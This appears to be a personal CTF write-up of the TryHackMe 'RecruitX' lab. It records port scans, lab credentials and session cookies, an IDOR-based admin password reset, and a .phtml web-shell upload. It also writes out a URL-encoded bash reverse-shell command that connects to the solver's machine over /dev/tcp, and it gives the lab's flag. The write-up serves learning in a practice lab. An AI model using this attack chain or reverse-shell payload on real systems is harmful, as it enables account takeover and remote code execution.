---
tags:
  - ctf
  - "#thm"
  - "#RecruitX"
created: 2026-08-09
---

# `RecruitX` 
> 

## 🔐 Connection data

| Parameter | Value                            |
| --------- | -------------------------------- |
| Host      | `10.130.184.109`                 |
| Port      | `22`<br>`80`<br>`3306`<br>`8080` |
| Login     |                                  |
| Password  |                                  |

## 🎯 Task of the level
- get flag with IDOR vulnerability
## 🎯 Information

| Type of information  | Data                                                                                                                                                                                                          |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| service              | port 22 - `OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)`<br>port 80 - `Apache httpd 2.4.58 ((Ubuntu))`<br>port 3306 - `MySQL (unauthorized)`<br>port 8080 - `Apache httpd 2.4.58 ((Ubuntu))` |
| coockie              | PHPSESSID=6uro4eg1ss8u6l317gr270thts                                                                                                                                                                          |
| apache version       | `Apache/2.4.58 (Ubuntu)`                                                                                                                                                                                      |
| vulnerability        | IDOR vulnerability, while loggined in profile, we see profile.php?id=6, easy change id to other                                                                                                               |
| user access data     | login - `testuser@fake.thm`<br>password - `Password123`                                                                                                                                                       |
| admin access data    | login - `s.mitchell@recruitx.thm`<br>password - `Password123`, after reset                                                                                                                                    |
| admin coockies id    | PHPSESSID=p8579drll8hfnqc0u23e805n83                                                                                                                                                                          |
| upload vulnerability | allow upload .phtml extension files                                                                                                                                                                           |
| hostname             | `recruitx-prod`                                                                                                                                                                                               |
| system info          | `Linux recruitx-prod 6.8.0-1017-aws #18-Ubuntu SMP Wed Oct  2 20:17:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux`                                                                                               |

## 🎯 Tools

| Tool     | Destination                                   | Usage                                                                        |
| -------- | --------------------------------------------- | ---------------------------------------------------------------------------- |
| nmap     | scan ports, services...                       | nmap -sV -sC -p- 10.130.184.109                                              |
| gobuster | scan directories                              | gobuster dir -u http://10.130.184.109 -w gobuster-wordlist.txt -x php -x php |
| curl     | communication with web application in console |                                                                              |
| ncat     | used for activate port listener               |                                                                              |
## 📚 Key commands/technics

| Coomand | Desctiption |
| ------- | ----------- |
|         |             |
|         |             |
|         |             |

## 💡 Step by step

| Step | Action                                                                                                                        | Information                                                                                                        |
| ---- | ----------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| 1    | nmap -sV -sC -p- 10.130.184.109                                                                                               | scan ports and services                                                                                            |
| 2    | gobuster dir -u http://10.130.184.109 -w gobuster-wordlist.txt -x php -x php                                                  | scan directories                                                                                                   |
| 3    | curl http://10.130.184.109/api/                                                                                               | view API endpoints                                                                                                 |
| 4    | change id in login page to 1                                                                                                  | we get access to admin profile information, IDOR vuln                                                              |
| 5    | copy admin email and use it for reset password                                                                                | we reseting password by using admin email and set my own password                                                  |
| 6    | copy admin coockie                                                                                                            | PHPSESSID=p8579drll8hfnqc0u23e805n83                                                                               |
| 7    | `http://10.130.184.109/admin/`                                                                                                | navigate to admin panel                                                                                            |
| 8    | upload .phtml file                                                                                                            | discover which type of files accept for upload                                                                     |
| 9    | upload shellcode file                                                                                                         | shellcode file give access to execute commands by `http://10.130.184.109/uploads/documents/shell.phtml?cmd=whoami` |
| 10   | ncat -lvnp 4444                                                                                                               | start listener                                                                                                     |
| 11   | `http://10.130.184.109/uploads/documents/shell.phtml?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.167.216/4444+0%3E%261%27` | get shell by connect to our machine                                                                                |
| 12   |                                                                                                                               |                                                                                                                    |

## 🔍 Result
Flag: THM{ch41n3d_vulns_4r3_d3v4st4t1ng}

## 🚪 Travel
-> [Level_N]

## 🔗 Link
- [Название ресурса](URL)